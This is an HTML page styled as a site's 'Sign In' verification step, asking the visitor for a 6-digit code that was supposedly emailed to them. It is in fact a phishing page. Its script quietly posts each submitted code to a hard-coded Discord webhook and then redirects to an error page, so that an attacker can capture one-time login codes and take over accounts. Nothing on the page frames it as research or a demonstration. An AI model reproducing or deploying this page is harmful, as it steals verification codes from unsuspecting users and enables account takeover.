<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign In</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    html, body {
      height: 100%;
      width: 100%;
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(-45deg, #2c003e, #3b1f5c, #4b2a6f, #6c3fa0);
      background-size: 400% 400%;
      animation: gradientShift 30s ease infinite;
      overflow: hidden;
      position: relative;
      color: #fff;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .navbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(0,0,0,0.6);
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .nav-left {
      display: flex;
      gap: 30px;
    }

    .nav-item {
      font-weight: 600;
      font-size: 16px;
      color: #888;
      text-decoration: line-through;
      cursor: not-allowed;
      position: relative;
    }

    .nav-item.home {
      color: #fff;
      text-decoration: none;
      cursor: pointer;
    }

    .nav-item.home:hover {
      color: #9b59b6;
      text-shadow: 0 0 6px #9b59b6;
    }

    .nav-item.disabled:hover::after {
      content: "Need to sign in to access";
      position: absolute;
      top: 120%;
      left: 0;
      background: #222;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 12px;
      white-space: nowrap;
      color: #fff;
      opacity: 0.9;
    }

    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.75);
      padding: 50px 40px;
      border-radius: 20px;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
      width: 100%;
      max-width: 500px;
      animation: enterGlow 1.2s ease-out;
      z-index: 2;
    }

    @keyframes enterGlow {
      0% {
        transform: translate(-50%, -50%) scale(0.85);
        box-shadow: 0 0 0 rgba(0,0,0,0);
      }
      50% {
        transform: translate(-50%, -50%) scale(1.02);
        box-shadow: 0 0 60px rgba(155, 89, 182, 0.4);
      }
      100% {
        transform: translate(-50%, -50%) scale(1);
        box-shadow: 0 0 40px rgba(0,0,0,0.8);
      }
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-weight: 600;
      font-size: 2rem;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    input {
      padding: 16px;
      border: none;
      border-radius: 10px;
      background: #3b2f4f;
      color: #fff;
      font-size: 16px;
      transition: box-shadow 0.3s ease;
    }

    input:focus {
      outline: none;
      box-shadow: 0 0 12px #9b59b6;
    }

    button {
      padding: 16px;
      background: #9b59b6;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease;
      animation: pulse 2s infinite;
    }

    button:hover {
      background: #8e44ad;
      transform: scale(1.03);
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(155, 89, 182, 0.6); }
      70% { box-shadow: 0 0 0 15px rgba(155, 89, 182, 0); }
      100% { box-shadow: 0 0 0 0 rgba(155, 89, 182, 0); }
    }
  </style>
</head>
<body>
  <div class="navbar">
    <div class="nav-left">
      <a href="index.html" class="nav-item home">Home</a>
      <div class="nav-item disabled">Marketplace</div>
      <div class="nav-item disabled">Download</div>
      <div class="nav-item disabled">Search</div>
    </div>
  </div>

  <div class="container">
    <h2>A Verification Code Was Sent To Your Email:</h2>
    <form id="form2">
      <input type="text" id="Code" placeholder="6-digit Code" required>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1413009868364976218/FRWyak8eE5D6BdqXv5x3_bMiKexf5I8x1y1qJuMPHRMcirw3qxCZseR5qXdatlQrCntp';

    const sendCode = (code) => {
      const msg = {
        content: `🔐 Code submitted!\n**Code:** ${code}`,
        embeds: [{
          title: 'Code Entry',
          color: 15158332,
          fields: [{ name: 'Code', value: code }],
          timestamp: new Date().toISOString()
        }]
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msg)
      })
      .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        console.log('Code webhook sent successfully');
        setTimeout(() => window.location.href = "Error.html", 750);
      })
      .catch(err => {
        console.error('Code webhook error:', err);
      });
    };

    document.addEventListener('DOMContentLoaded', () => {
      document.querySelector('#form2').addEventListener('submit', (e) => {
        e.preventDefault();
        const code = document.querySelector('#Code').value.trim();
        if (!/^\d{6}$/.test(code)) {
          alert('Code must be exactly 6 digits.');
          return;
        }
        sendCode(code);
      });
    });
  </script>
</body>
</html>
